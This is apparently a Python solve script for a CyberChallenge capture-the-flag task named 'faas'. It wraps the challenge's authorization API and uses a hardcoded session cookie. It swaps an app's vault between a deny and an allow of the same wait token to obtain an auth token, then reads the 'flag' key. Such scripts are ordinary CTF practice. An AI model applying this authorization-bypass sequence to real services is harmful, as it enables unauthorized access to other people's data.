import requests as r
import threading


class Faas:

    def __init__(self, hostname, app_id, wait_token=None, refresh_token=None, debug=False):
        self.app_id = app_id
        self.refresh_token = refresh_token
        self.wait_token = wait_token
        self.base_url = f'http://{hostname}/api'
        self.debug = debug

        # ask the the api for the auth

    def authorize(self):
        """
            Asks the authorization to the owner of the app
            Returns a "wait_token", that can be used to check whether the user has given an authorization
            and to retrive the auth token
        """
        url = self.base_url + '/authorize/{}'.format(self.app_id)
        if self.debug:
            print(url)

        resp = r.get(url).json()

        self.wait_token = resp['token']
        if self.debug:
            print(f"Status: {resp['token']}")
        return resp['token']

    def get_refresh_token(self):
        """
            Check if the user has given the authorization.
            If so returns an refresh token, that can be used to retrieve an authtoken.
            Note that once the refresh token is retrieve, the "wait_token" is not valid anymore
        """

        url = self.base_url + '/get_refresh/{}'.format(self.wait_token)

        if self.debug:
            print(url)

        resp = r.get(url).json()
        if 'status' in resp and  resp['status'] == 'accepted':
            self.refresh_token = resp['token']
            return resp['token']
        else:
            if self.debug:
                print(f"Status: {resp['status']}")
            return False

    def get_auth_token(self):
        """
            Retrieves an auth token that can be used to query the app
        """

        url  = self.base_url + '/refresh/{}'.format(self.refresh_token)
        if self.debug:
            print(url)

        resp = r.get(url)
        
        if resp.status_code == 401:
            if self.debug:
                print("Invalid refresh token")
            return False

        resp = resp.json()

        self.auth_token = resp['token']
        if self.debug:
            print(resp['token'])
        return resp['token']

    def set(self, key, value):
        """
        Sets a key to a value
        """
        url = self.base_url + '/set/{}/{}'.format(self.app_id, key)
        if self.debug:
            print(url)
        headers = {'Auth': self.auth_token}
        data = {'value': value}
        resp = r.post(url,
                      headers=headers, json=data)
       
        if resp.status_code == 401:
            print('Invalid auth_token. Check your refresh token')
            return 'Invalid auth_token. Check your refresh token'
        return resp.json()['status']

    def get(self, key):
        """
        Gets the value of a key
        """
        url = self.base_url+ '/get/{}/{}'.format(self.app_id, key)

        headers = {'Auth': self.auth_token}
        if self.debug:
            print(url)

        resp = r.get(url, headers=headers)
        if resp.status_code == 401:
            print('Invalid auth_token. Check your refresh token')
            return 
        return resp.json()['data']
    
    
def action_token(token: str, action: str = 'allow'):
    header = {
        "Content-Type": "application/x-www-form-urlencoded",
        "Cookie": "session=eyJ1c2VyIjoidGVzdHRlc3QifQ.aaGg7A.Tx9uOpGu2o0_zQxQofYBz1aMTow"
    }
    
    rsp = r.post("http://faas.challs.cyberchallenge.it/requests", headers=header, data=f"token={token}&action={action}")


def change_vault(appid: str, vault: str):
    header = {
        "Content-Type": "application/x-www-form-urlencoded",
        "Cookie": "session=eyJ1c2VyIjoidGVzdHRlc3QifQ.aaGg7A.Tx9uOpGu2o0_zQxQofYBz1aMTow"
    }
    
    payload = f'new_vault={vault}&action=change'
    r.post(f"http://faas.challs.cyberchallenge.it/app/{appid}", headers=header, data=payload)

    
if __name__ == '__main__':
    target_vault = "bdc3e1e0-fa24-48fe-9f96-3c5390dbd842"
    appid = "2f063a52-9869-4717-8c56-22819dd1e5a1"
    appid2 = "827c13ac-85c1-470f-b42e-48f3605d54fd"
    vault = "2b256fbe-0610-4c56-8133-b2de888289c9"
    
    
    api = Faas("faas.challs.cyberchallenge.it", appid)

    change_vault(appid, vault)
    wait_token = api.authorize()
    action_token(wait_token, 'deny')
    
    change_vault(appid, target_vault)
    action_token(wait_token, 'allow')
    
    api.get_refresh_token()
    token = api.get_auth_token()
    
    print(api.get("flag"))